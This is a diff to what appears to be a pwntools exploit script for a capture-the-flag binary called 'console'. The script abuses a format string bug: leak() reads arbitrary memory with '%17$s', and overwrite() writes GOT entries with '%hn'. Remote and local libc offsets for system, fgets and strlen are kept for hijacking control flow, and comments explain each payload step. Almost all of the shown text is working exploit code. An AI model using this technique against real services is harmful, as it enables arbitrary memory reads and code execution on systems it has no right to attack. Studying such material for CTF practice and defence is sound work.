@@ -20,33 +20,46 @@ EXIT_GOT      = 0x601258
 FGETS_GOT     = 0x601230
 # be aware that every system with different libc.so.6 has different offset
 # the remote part is by readelfing the lib.so.6 on server with the similiar path
-FGETS_OFFSET  = 0x69df0 # remote
-SYSTEM_OFFSET = 0x41490 # remote
-STRLEN_OFFSET = 0x81c10 # remote
-# FGETS_OFFSET  = 0x6d070 # local
-# SYSTEM_OFFSET = 0x41d40 # local
-# STRLEN_OFFSET = 0x858e0 # local
+REMOTE_FGETS_OFFSET  = 0x69df0 # remote
+REMOTE_SYSTEM_OFFSET = 0x41490 # remote
+REMOTE_STRLEN_OFFSET = 0x81c10 # remote
+LOCAL_FGETS_OFFSET  = 0x6d070 # local
+LOCAL_SYSTEM_OFFSET = 0x41d40 # local
+LOCAL_STRLEN_OFFSET = 0x858e0 # local
+FGETS_OFFSET = REMOTE_FGETS_OFFSET
+SYSTEM_OFFSET = REMOTE_SYSTEM_OFFSET
+STRLEN_OFFSET = REMOTE_STRLEN_OFFSET
 
 def info(msg):
     log.info(msg)
 
 def leak(addr):
+    # align to 8 is because of parameter size
+    # when printf tries to find param by "%17$s"
     payload  = "exit".ljust(8)
+    # the '|' is just a identifier used later
+    # it will treat the 17th param as a string pointer
+    # and print the value it points to ([pointer])
     payload += "|%17$s|".rjust(8)
     payload += "blablala"
+    # convert address to right hex string on stack
+    # this is last part because it could contain null
+    # and breaks the string
     payload += p64(addr)
 
     p.sendline(payload)
     p.recvline()
 
     data   = p.recvuntil("blablala")
-    fgets  = data.split('|')[1]
-    fgets  = hex(u64(fgets.ljust(8, "\x00")))
+    leaked  = data.split('|')[1]
+    leaked  = hex(u64(leaked.ljust(8, "\x00")))
 
-    return fgets
+    return leaked
 
 def overwrite(addr, pad):
     payload  = "exit".ljust(8)
+    # pad replaces %du
+    # then 'hn' write the first half [addr]
     payload += ("%%%du|%%17$hn|" % pad).rjust(16)
     payload += p64(addr)
 
@@ -95,6 +108,9 @@ def exploit(p):
 
 if __name__ == "__main__":
     if len(sys.argv) > 1: # use file name as param
+        FGETS_OFFSET = LOCAL_FGETS_OFFSET
+        SYSTEM_OFFSET = LOCAL_SYSTEM_OFFSET
+        STRLEN_OFFSET = LOCAL_STRLEN_OFFSET
         p = process(['./console', sys.argv[1]])
         pause()
         exploit(p)
